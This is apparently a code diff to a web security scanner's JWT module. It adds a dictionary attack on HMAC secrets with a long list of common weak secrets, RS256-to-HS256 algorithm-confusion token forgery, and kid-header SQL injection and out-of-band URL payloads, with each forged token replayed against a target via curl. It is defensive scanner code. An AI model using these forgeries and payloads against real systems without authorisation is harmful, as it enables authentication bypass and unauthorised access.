@@ -2,6 +2,7 @@ import asyncio
 import copy
 import base64
 import hashlib
+import hmac
 import json
 import os
 import random
@@ -4490,18 +4491,17 @@ async def jwt_vulnerability_test(
                         "none_alg_status": none_status,
                         "tampered_signature_status": tampered_status,
                     })
+                # Weak-secret dictionary attack (pure-python, honors the token's
+                # discovered HS256/HS384/HS512 algorithm; skips asymmetric algs).
                 try:
-                    import jwt as pyjwt
-                    weak_secrets = ['secret', 'password', '123456', 'key', 'jwt', 'token']
-                    for secret in weak_secrets:
-                        try:
-                            pyjwt.decode(sample_token, secret, algorithms=['HS256'])
-                            results["vulnerable"] = True
-                            results["issues"].append("weak_secret")
-                            results["evidence"].append({"type": "weak_secret", "secret": secret})
-                            break
-                        except Exception:
-                            continue
+                    weak_results = jwt_weak_secret_bruteforce(
+                        sample_token,
+                        ['secret', 'password', '123456', 'key', 'jwt', 'token'],
+                    )
+                    if weak_results.get("vulnerable"):
+                        results["vulnerable"] = True
+                        results["issues"].extend(weak_results.get("issues", []))
+                        results["evidence"].extend(weak_results.get("evidence", []))
                 except Exception:
                     pass
         except Exception:
@@ -4543,7 +4543,13 @@ JWT_WEAK_SECRETS_DEFAULT = [
 
 
 def _load_jwt_secrets_wordlist() -> list[str]:
-    """Load JWT weak secrets from wordlist file if available."""
+    """Load JWT weak secrets from wordlist file, merged with curated defaults.
+
+    File entries keep their order; curated real-world defaults are appended
+    (deduplicated) so the dictionary attack covers jwt.io/auth0/tutorial
+    secrets even when the wordlist file is missing or thin.
+    """
+    secrets: list[str] = []
     wordlist_paths = [
         os.path.join(os.path.dirname(__file__), '..', 'payloads', 'jwt', 'weak-secrets.txt'),
         '/app/payloads/jwt/weak-secrets.txt',
@@ -4554,11 +4560,18 @@ def _load_jwt_secrets_wordlist() -> list[str]:
             try:
                 with open(path, 'r') as f:
                     secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-                    return secrets if secrets else JWT_WEAK_SECRETS_DEFAULT
+                    break
             except Exception:
                 pass
 
-    return JWT_WEAK_SECRETS_DEFAULT
+    merged: list[str] = []
+    seen: set[str] = set()
+    for secret in secrets + JWT_WEAK_SECRETS_DEFAULT + JWT_WEAK_SECRETS_CURATED:
+        if secret not in seen:
+            seen.add(secret)
+            merged.append(secret)
+
+    return merged if merged else list(JWT_WEAK_SECRETS_CURATED)
 
 
 def _decode_jwt_parts(token: str) -> tuple[dict | None, dict | None, str | None]:
@@ -4586,6 +4599,242 @@ def _encode_jwt_parts(header: dict, payload: dict, signature: str = "") -> str:
     header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
     payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
     return f"{header_b64}.{payload_b64}.{signature}"
+
+
+# HMAC algorithms supported by the pure-python JWT forge/verify helpers below.
+JWT_HMAC_ALGS = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
+
+
+def _jwt_hmac_signature(signing_input: str, secret: str, alg: str) -> str:
+    """Compute the base64url HMAC signature for a JWT signing input."""
+    digest = JWT_HMAC_ALGS.get(str(alg).upper())
+    if digest is None:
+        raise ValueError(f"unsupported HMAC algorithm: {alg}")
+    signature = hmac.new(
+        secret.encode("utf-8", "surrogatepass"),
+        signing_input.encode("utf-8", "surrogatepass"),
+        digest,
+    ).digest()
+    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("ascii")
+
+
+def _jwt_hmac_token(header: dict, payload: dict, secret: str, alg: str = "HS256") -> str:
+    """Craft an HMAC-signed JWT (HS256/HS384/HS512) without external libraries.
+
+    Extra header fields (e.g. an attacker-controlled 'kid') are preserved.
+    """
+    alg = str(alg).upper()
+    if alg not in JWT_HMAC_ALGS:
+        raise ValueError(f"unsupported HMAC algorithm: {alg}")
+    crafted_header = dict(header or {})
+    crafted_header["alg"] = alg
+    crafted_header.setdefault("typ", "JWT")
+    header_b64 = base64.urlsafe_b64encode(json.dumps(crafted_header, separators=(',', ':')).encode()).rstrip(b"=").decode()
+    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b"=").decode()
+    signing_input = f"{header_b64}.{payload_b64}"
+    return f"{signing_input}.{_jwt_hmac_signature(signing_input, secret, alg)}"
+
+
+def _jwt_hmac_verify(token: str, secret: str, alg: str | None = None) -> bool:
+    """Verify a JWT's HMAC signature (HS256/HS384/HS512) with a candidate secret."""
+    try:
+        parts = token.split(".")
+        if len(parts) != 3 or not parts[2]:
+            return False
+        header, _payload, _signature = _decode_jwt_parts(token)
+        if not header:
+            return False
+        token_alg = str(alg or header.get("alg") or "").upper()
+        if token_alg not in JWT_HMAC_ALGS:
+            return False
+        expected = _jwt_hmac_signature(f"{parts[0]}.{parts[1]}", secret, token_alg)
+        return hmac.compare_digest(expected, parts[2])
+    except Exception:
+        return False
+
+
+# Curated real-world JWT secrets: jwt.io defaults, jsonwebtoken/express-jwt README
+# examples, framework tutorial secrets, docker-compose/template defaults, and
+# common base64/hex-looking placeholder keys. Merged into the file wordlist by
+# _load_jwt_secrets_wordlist() so the dictionary attack stays useful even when
+# the wordlist file is missing or thin.
+JWT_WEAK_SECRETS_CURATED = [
+    # timeless top hits
+    'secret', 'password', '123456', 'key', 'jwt', 'token',
+    # jwt.io defaults
+    'your-256-bit-secret', 'your-512-bit-secret', 'sUP3rs3cr3t',
+    # jsonwebtoken / express-jwt / passport README examples
+    'shhhh', 'shh', 'keyboard cat', 'ilovepie', 'ilovecake', 'iheartcake',
+    # flask / django / tutorial examples
+    'super-secret', 'you-will-never-guess', 'please-change-me', 'change-me',
+    'django-insecure', 'dev-only-secret', 'notsosecret', 'not-a-secret',
+    # auth-style defaults
+    'auth_secret', 'authsecret', 'auth-key', 'auth_key',
+    'jwt_secret', 'jwt-secret', 'jwtsecret', 'jwt_key', 'jwtkey', 'jwt-key',
+    'jwt_secret_key', 'jwt-secret-key', 'my_jwt_secret', 'my-jwt-secret',
+    'your_jwt_secret', 'your-jwt-secret',
+    'token_secret', 'token-secret', 'tokensecret',
+    'signing_key', 'signing-key', 'signingkey', 'sign_key', 'signkey',
+    'hmac_secret', 'hmac-secret', 'hmacsecret',
+    'app_secret', 'app-secret', 'appsecret', 'application_secret',
+    'api_secret', 'api-secret', 'apisecret', 'api_key', 'apikey',
+    'access_token_secret', 'accessTokenSecret',
+    'session_secret', 'session-secret', 'sessionsecret',
+    # docker-compose / template defaults
+    'secretkey', 'secret-key', 'secret_key', 'SECRET_KEY', 'SecretKey',
+    'supersecret', 'supersecretkey', 'super-secret-key', 'super_secret_key',
+    'topsecret', 'top-secret', 'verysecret', 'verysecretkey', 'ultrasecret',
+    'mysecret', 'my-secret', 'mysecretkey', 'my-secret-key',
+    'this_is_a_secret', 'this-is-a-secret', 'asecret',
+    's3cr3t', 's3cret', 's3cr3tkey', 'secr3t',
+    # common passwords reused as JWT secrets
+    'password1', 'password123', 'P@ssw0rd', 'admin123', 'root', 'toor',
+    'qwerty123', 'letmein', 'welcome', 'welcome1', 'monkey', 'dragon',
+    'iloveyou', 'abc123', 'changeme', 'changeme123', 'changeit',
+    'test123', 'dev123', 'dev', 'development', 'staging', 'production',
+    # base64-looking defaults
+    'c2VjcmV0', 'c2VjcmV0IQ==', 'c3VwZXJzZWNyZXQ=', 'and0X3NlY3JldA==',
+    'cGFzc3dvcmQ=', 'YWRtaW4=', 'MTIzNDU2Nzg5MA==',
+    # hex / filler placeholder keys
+    'deadbeef', '0000', '0000000000', '1234567890abcdef',
+    'aaaa', 'aaaaaaaa', 'aaaaaaaaaaaaaaaa',
+    # empty-ish values
+    '', ' ', 'null', 'none', 'undefined',
+]
+
+
+def jwt_weak_secret_bruteforce(
+    sample_token: str,
+    secrets: list[str] | None = None,
+) -> dict[str, Any]:
+    """Offline dictionary attack against a JWT's HMAC signature.
+
+    Pure-python (stdlib hmac/hashlib): recomputes the signature over the
+    token's signing input with each candidate secret and compares digests in
+    constant time. Only runs against the token's discovered algorithm when it
+    is HS256/HS384/HS512; asymmetric algorithms are not dictionary-attackable
+    and are skipped.
+    """
+    results: dict[str, Any] = {
+        "vulnerable": False,
+        "issues": [],
+        "evidence": [],
+        "secret": None,
+        "alg": None,
+    }
+    header, _payload, signature = _decode_jwt_parts(sample_token)
+    if not header or not signature:
+        results["reason"] = "unreadable token"
+        return results
+
+    alg = str(header.get("alg") or "").upper()
+    results["alg"] = alg or None
+    if alg not in JWT_HMAC_ALGS:
+        results["reason"] = f"algorithm {alg or 'missing'} is not HMAC-brute-forceable"
+        return results
+
+    if secrets is None:
+        secrets = _load_jwt_secrets_wordlist()
+
+    seen: set[str] = set()
+    for secret in secrets:
+        if secret in seen:
+            continue
+        seen.add(secret)
+        if _jwt_hmac_verify(sample_token, secret, alg):
+            results.update({
+                "vulnerable": True,
+                "secret": secret,
+                "issues": ["weak_secret"],
+                "evidence": [{
+                    "type": "weak_secret",
+                    "secret": secret,
+                    "alg": alg,
+                    "severity": "high",
+                    "cwe": "CWE-326",
+                    "description": f"JWT '{alg}' signature forged offline with dictionary secret {secret!r}",
+                }],
+            })
+            break
+    return results
+
+
+async def _jwt_replay_status(url: str, token: str, auth_args: list[str] | None = None) -> int:
+    """Return the real HTTP status of a Bearer-token replay (0 on error).
+
+    Uses %{http_code} instead of scanning the response body for "401"/"403":
+    a body-substring check falsely fires on any page whose text happens to
+    contain those digits and ignores the actual status code.
+    """
+    out, _err, rc = await run(
+        ["curl", "-sS", "-L", "-k", "-o", "/dev/null", "-w", "%{http_code}",
+         "-H", f"Authorization: Bearer {token}"] + list(auth_args or []) + [url],
+        timeout=10,
+    )
+    if rc != 0 or not out:
+        return 0
+    try:
+        return int(str(out).strip()[-3:])
+    except (TypeError, ValueError):
+        return 0
+
+
+async def _jwt_discover_jwks_url(url: str) -> str | None:
+    """Discover a JWKS URL from well-known endpoints."""
+    for endpoint in ['/.well-known/jwks.json', '/jwks.json', '/.well-known/openid-configuration']:
+        test_url = urllib.parse.urljoin(url, endpoint)
+        out, err, rc = await run(["curl", "-sS", "-L", "-k", test_url], timeout=10)
+        if rc == 0 and out:
+            if endpoint.endswith('openid-configuration'):
+                try:
+                    config = json.loads(out)
+                    jwks_url = config.get('jwks_uri')
+                    if jwks_url:
+                        return jwks_url
+                except Exception:
+                    continue
+            elif 'keys' in out:
+                return test_url
+    return None
+
+
+async def _jwt_fetch_jwks_rsa_keys(jwks_url: str) -> list[dict[str, Any]]:
+    """Fetch a JWKS document and convert its RSA keys to PEM.
+
+    Returns a list of {"kid": ..., "pem": ...} entries. Requires pyjwt +
+    cryptography at runtime (workers ship them); returns [] when unavailable
+    so callers degrade gracefully.
+    """
+    out, err, rc = await run(["curl", "-sS", "-L", "-k", jwks_url], timeout=10)
+    if rc != 0 or not out:
+        return []
+    try:
+        jwks = json.loads(out)
+    except Exception:
+        return []
+
+    keys: list[dict[str, Any]] = []
+    for key in jwks.get('keys', []):
+        if key.get('kty') != 'RSA':
+            continue
+        try:
+            import jwt as pyjwt  # noqa: F401 - presence check for the conversion below
+            from jwt.algorithms import RSAAlgorithm
+            from cryptography.hazmat.primitives import serialization
+
+            public_key_obj = RSAAlgorithm.from_jwk(json.dumps(key))
+            pem = public_key_obj.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            ).decode()
+            keys.append({"kid": key.get("kid"), "pem": pem})
+        except Exception:
+            continue
+    return keys
 
 
 async def jwt_algorithm_confusion_test(
@@ -4616,137 +4865,192 @@ async def jwt_algorithm_confusion_test(
 
     # Try to discover JWKS URL
     if not jwks_url:
-        for endpoint in ['/.well-known/jwks.json', '/jwks.json', '/.well-known/openid-configuration']:
-            test_url = urllib.parse.urljoin(url, endpoint)
-            out, err, rc = await run(["curl", "-sS", "-L", "-k", test_url], timeout=10)
-            if rc == 0 and out:
-                if endpoint.endswith('openid-configuration'):
-                    try:
-                        config = json.loads(out)
-                        jwks_url = config.get('jwks_uri')
-                        break
-                    except Exception:
-                        continue
-                elif 'keys' in out:
-                    jwks_url = test_url
-                    break
+        jwks_url = await _jwt_discover_jwks_url(url)
 
     if not jwks_url:
         return results
 
-    # Fetch JWKS and extract public key
-    out, err, rc = await run(["curl", "-sS", "-L", "-k", jwks_url], timeout=10)
-    if rc != 0 or not out:
-        return results
+    # Fetch JWKS and convert RSA keys to PEM (gracefully empty when the
+    # runtime lacks pyjwt/cryptography or the fetch fails)
+    for key_entry in await _jwt_fetch_jwks_rsa_keys(jwks_url):
 
-    try:
-        jwks = json.loads(out)
-        keys = jwks.get('keys', [])
+        try:
+            import jwt as pyjwt
 
-        for key in keys:
-            if key.get('kty') != 'RSA':
-                continue
+            # Create HS256 token signed with public key as secret
+            forged_token = pyjwt.encode(payload, key_entry["pem"], algorithm='HS256')
 
-            try:
-                import jwt as pyjwt
-                from jwt.algorithms import RSAAlgorithm
-                from cryptography.hazmat.primitives import serialization
+            # Test the forged token
+            auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
+            test_out, test_err, test_rc = await run(
+                ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
+                timeout=10
+            )
 
-                # Convert JWK to PEM
-                public_key_obj = RSAAlgorithm.from_jwk(json.dumps(key))
-                public_key_str = public_key_obj.public_bytes(
-                    encoding=serialization.Encoding.PEM,
-                    format=serialization.PublicFormat.SubjectPublicKeyInfo
-                ).decode()
-
-                # Create HS256 token signed with public key as secret
-                forged_token = pyjwt.encode(payload, public_key_str, algorithm='HS256')
-
-                # Test the forged token
-                auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
-                test_out, test_err, test_rc = await run(
-                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
-                    timeout=10
-                )
-
-                if test_rc == 0 and test_out:
-                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
-                        results["vulnerable"] = True
-                        results["issues"].append("algorithm_confusion")
-                        results["evidence"].append({
-                            "type": "algorithm_confusion",
-                            "original_alg": original_alg,
-                            "attack_alg": "HS256",
-                            "description": f"Server accepted RS256->HS256 algorithm confusion attack",
-                            "jwks_url": jwks_url,
-                        })
-                        break
-            except Exception:
-                continue
-
-    except Exception:
-        pass
+            if test_rc == 0 and test_out:
+                if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
+                    results["vulnerable"] = True
+                    results["issues"].append("algorithm_confusion")
+                    results["evidence"].append({
+                        "type": "algorithm_confusion",
+                        "original_alg": original_alg,
+                        "attack_alg": "HS256",
+                        "severity": "high",
+                        "cwe": "CWE-347",
+                        "description": f"Server accepted RS256->HS256 algorithm confusion attack",
+                        "jwks_url": jwks_url,
+                    })
+                    break
+        except Exception:
+            continue
 
     return results
+
+
+# Bounded budget for kid-header attack attempts per target (forges + replays).
+JWT_KID_MAX_ATTEMPTS = 8
+
+# Distinct finding titles per kid attack technique. Evidence entries carry the
+# full intended finding shape (title/severity/cwe) so downstream consumers can
+# report them without re-deriving it from the technique key.
+JWT_KID_ATTACK_TITLES = {
+    "kid_sqli_injection": "JWT 'kid' header SQL injection (forged token accepted)",
+    "kid_ssrf_oob": "JWT 'kid' header URL injection (SSRF-style key fetch, forged token accepted)",
+    "kid_algorithm_confusion": "JWT 'kid' key-swap algorithm confusion (HS256 signed with public key, accepted)",
+}
+
+
+def _jwt_kid_attack_payloads(
+    oob_callback_url: str | None = None,
+    known_secret: str | None = None,
+) -> list[dict[str, str]]:
+    """Build the bounded kid-header attack payload list.
+
+    Techniques:
+    - SQL injection in 'kid' when the server builds a key-lookup query from it
+      (signed with the secret the injected query would select).
+    - SSRF-style 'kid' URL (server-side key fetch) — only when an out-of-band
+      callback URL is configured; skipped otherwise since black-box acceptance
+      cannot be observed without it.
+    The kid-swap algorithm-confusion attempt is assembled separately by
+    jwt_kid_injection_test because it needs the target's JWKS public key.
+    """
+    payloads: list[dict[str, str]] = []
+    primary_secret = known_secret or 'secret'
+
+    # (b) SQL injection in kid
+    payloads.append({"technique": "kid_sqli_injection", "kid": "' OR 1=1--", "secret": ""})
+    payloads.append({"technique": "kid_sqli_injection", "kid": "' UNION SELECT 'secret'-- -", "secret": "secret"})
+    if known_secret and known_secret not in ("", "secret"):
+        payloads.append({
+            "technique": "kid_sqli_injection",
+            "kid": f"' UNION SELECT '{known_secret}'-- -",
+            "secret": known_secret,
+        })
+    payloads.append({"technique": "kid_sqli_injection", "kid": "1' OR '1'='1'-- -", "secret": primary_secret})
+
+    # (c) SSRF-style kid URL — only with a configured OOB callback
+    if oob_callback_url:
+        base = str(oob_callback_url)
+        if "://" not in base:
+            base = f"http://{base}"
+        payloads.append({"technique": "kid_ssrf_oob", "kid": base, "secret": ""})
+        payloads.append({"technique": "kid_ssrf_oob", "kid": f"{base.rstrip('/')}/jwks.json", "secret": primary_secret})
+
+    return payloads[:JWT_KID_MAX_ATTEMPTS]
 
 
 async def jwt_kid_injection_test(
     url: str,
     sample_token: str,
     auth_session: Any = None,
+    oob_callback_url: str | None = None,
+    known_secret: str | None = None,
 ) -> dict[str, Any]:
     """
     Test JWT kid (Key ID) header injection vulnerabilities.
 
-    The 'kid' header parameter can be vulnerable to:
-    1. Path traversal - read arbitrary files as key
-    2. SQL injection - if kid is used in database query
-    3. Command injection - if kid is passed to shell
+    Black-box techniques (server-side file reads via kid path traversal are
+    NOT verifiable black-box, so they are not attempted):
+    1. SQL injection in 'kid' (' OR 1=1--, UNION SELECT ...) when the server
+       uses kid in a key-lookup query.
+    2. SSRF-style kid URL — only when an OOB callback URL is configured.
+    3. Algorithm confusion via kid swap: forge an HS256 token signed with the
+       JWKS public key and the RSA key's kid.
+
+    Acceptance mirrors the other JWT forgery checks: a crafted token is a
+    finding only when the replay returns 2xx AND a deliberately tampered
+    signature on the original token is rejected (401/403). Total forged-token
+    replays are bounded by JWT_KID_MAX_ATTEMPTS.
     """
     results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
 
-    header, payload, _ = _decode_jwt_parts(sample_token)
-    if not header or not payload:
+    header, payload, signature = _decode_jwt_parts(sample_token)
+    if not header or not payload or not signature:
         return results
 
-    # kid injection payloads
-    kid_payloads = [
-        # Path traversal to /dev/null (empty key)
-        ("../../../../../../../dev/null", "", "path_traversal"),
-        ("....//....//....//....//dev/null", "", "path_traversal_bypass"),
-        ("/dev/null", "", "absolute_path"),
-        # SQL injection payloads
-        ("' UNION SELECT 'secret' -- ", "secret", "sqli_union"),
-        ("1'; SELECT 'secret';--", "secret", "sqli_stacked"),
-    ]
+    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
 
-    try:
-        import jwt as pyjwt
+    # Differential guard: the endpoint must actually validate signatures. If a
+    # tampered signature is accepted (2xx), the endpoint is public/no-auth and
+    # any kid "acceptance" would be a false positive.
+    signing_input = sample_token.rsplit('.', 1)[0]
+    tampered_status = await _jwt_replay_status(url, f"{signing_input}.invalidsignature", auth_args)
+    if tampered_status not in (401, 403):
+        return results
 
-        for kid_payload, expected_secret, attack_type in kid_payloads:
-            try:
-                forged_token = pyjwt.encode(payload, expected_secret, algorithm='HS256', headers={'kid': kid_payload})
+    def _record(technique: str, kid_payload: Any, status: int) -> None:
+        results["vulnerable"] = True
+        results["issues"].append(technique)
+        results["evidence"].append({
+            "type": technique,
+            "title": JWT_KID_ATTACK_TITLES.get(technique, f"JWT 'kid' header injection: {technique}"),
+            "severity": "high",
+            "cwe": "CWE-347",
+            "technique": technique,
+            "kid_payload": kid_payload,
+            "forged_token_status": status,
+            "tampered_signature_status": tampered_status,
+            "description": (
+                f"Server accepted (HTTP {status}) a forged HS256 JWT whose 'kid' "
+                f"header was set to {kid_payload!r}, while rejecting a tampered "
+                f"signature (HTTP {tampered_status})"
+            ),
+        })
 
-                auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
-                test_out, test_err, test_rc = await run(
-                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
-                    timeout=10
-                )
+    attempts = 0
+    for attack in _jwt_kid_attack_payloads(oob_callback_url=oob_callback_url, known_secret=known_secret):
+        if attempts >= JWT_KID_MAX_ATTEMPTS:
+            break
+        try:
+            forged_header = dict(header)
+            forged_header["kid"] = attack["kid"]
+            forged_token = _jwt_hmac_token(forged_header, payload, attack["secret"], "HS256")
+        except Exception:
+            continue
+        attempts += 1
+        status = await _jwt_replay_status(url, forged_token, auth_args)
+        if 200 <= status < 300:
+            _record(attack["technique"], attack["kid"], status)
 
-                if test_rc == 0 and test_out:
-                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
-                        results["vulnerable"] = True
-                        results["issues"].append(f"kid_{attack_type}")
-                        results["evidence"].append({
-                            "type": f"kid_{attack_type}",
-                            "kid_payload": kid_payload,
-                            "description": f"Server accepted JWT with injected kid: {kid_payload}",
-                        })
-            except Exception:
-                continue
-
-    except ImportError:
-        pass
+    # (d) Algorithm confusion via kid swap to the public key: only when the
+    # original algorithm is asymmetric and a JWKS with an RSA key is reachable.
+    original_alg = str(header.get('alg') or '').upper()
+    if original_alg.startswith(('RS', 'ES', 'PS')) and attempts < JWT_KID_MAX_ATTEMPTS:
+        jwks_url = await _jwt_discover_jwks_url(url)
+        if jwks_url:
+            for key_entry in (await _jwt_fetch_jwks_rsa_keys(jwks_url))[:1]:
+                try:
+                    forged_header = dict(header)
+                    if key_entry.get("kid"):
+                        forged_header["kid"] = key_entry["kid"]
+                    forged_token = _jwt_hmac_token(forged_header, payload, key_entry["pem"], "HS256")
+                except Exception:
+                    continue
+                attempts += 1
+                status = await _jwt_replay_status(url, forged_token, auth_args)
+                if 200 <= status < 300:
+                    _record("kid_algorithm_confusion", key_entry.get("kid"), status)
 
     return results
 
@@ -4862,15 +5166,18 @@ async def jwt_comprehensive_test(
     url: str,
     sample_token: str | None = None,
     auth_session: Any = None,
+    oob_callback_url: str | None = None,
 ) -> dict[str, Any]:
     """
     Run comprehensive JWT security tests.
 
     Combines all JWT vulnerability tests:
     1. None algorithm
-    2. Weak secret brute-force (extended)
+    2. Weak secret brute-force (pure-python HMAC dictionary attack against the
+       discovered HS256/HS384/HS512 algorithm, wordlist + curated secrets)
     3. Algorithm confusion (RS256->HS256)
-    4. kid header injection
+    4. kid header injection (SQLi / SSRF-style URL when an OOB callback is
+       configured / kid-swap algorithm confusion)
     5. Claim manipulation
     """
     results: dict[str, Any] = {
@@ -4929,28 +5236,17 @@ async def jwt_comprehensive_test(
             if ev.get("type") == "weak_secret":
                 results["weak_secret_found"] = ev.get("secret")
 
-    # Test 2: Extended weak secret brute-force
+    # Test 2: Extended weak secret brute-force (pure-python HMAC dictionary
+    # attack over the wordlist + curated real-world secrets; only runs against
+    # the token's discovered HS256/HS384/HS512 algorithm)
     if not results["weak_secret_found"]:
         results["tests_run"].append("weak_secret_extended")
-        secrets_to_test = _load_jwt_secrets_wordlist()
-
-        try:
-            import jwt as pyjwt
-
-            for secret in secrets_to_test:
-                if secret in ['secret', 'password', '123456', 'key', 'jwt', 'token']:
-                    continue
-                try:
-                    pyjwt.decode(sample_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
-                    results["vulnerable"] = True
-                    results["issues"].append("weak_secret")
-                    results["evidence"].append({"type": "weak_secret", "secret": secret})
-                    results["weak_secret_found"] = secret
-                    break
-                except Exception:
-                    continue
-        except ImportError:
-            pass
+        brute_results = jwt_weak_secret_bruteforce(sample_token)
+        if brute_results.get("vulnerable"):
+            results["vulnerable"] = True
+            results["issues"].extend(brute_results.get("issues", []))
+            results["evidence"].extend(brute_results.get("evidence", []))
+            results["weak_secret_found"] = brute_results.get("secret")
 
     # Test 3: Algorithm confusion
     if header and header.get('alg', '').upper().startswith(('RS', 'ES', 'PS')):
@@ -4961,10 +5257,17 @@ async def jwt_comprehensive_test(
             results["issues"].extend(confusion_results.get("issues", []))
             results["evidence"].extend(confusion_results.get("evidence", []))
 
-    # Test 4: kid header injection
-    if header and 'kid' in header:
+    # Test 4: kid header injection (SQLi / SSRF-style URL / kid-swap confusion).
+    # Runs for any decodable token: servers may honor a 'kid' header even when
+    # the original token does not carry one. Attempts are bounded server-side.
+    if header:
         results["tests_run"].append("kid_injection")
-        kid_results = await jwt_kid_injection_test(url, sample_token, auth_session=auth_session)
+        kid_results = await jwt_kid_injection_test(
+            url, sample_token,
+            auth_session=auth_session,
+            oob_callback_url=oob_callback_url,
+            known_secret=results.get("weak_secret_found"),
+        )
         if kid_results.get("vulnerable"):
             results["vulnerable"] = True
             results["issues"].extend(kid_results.get("issues", []))
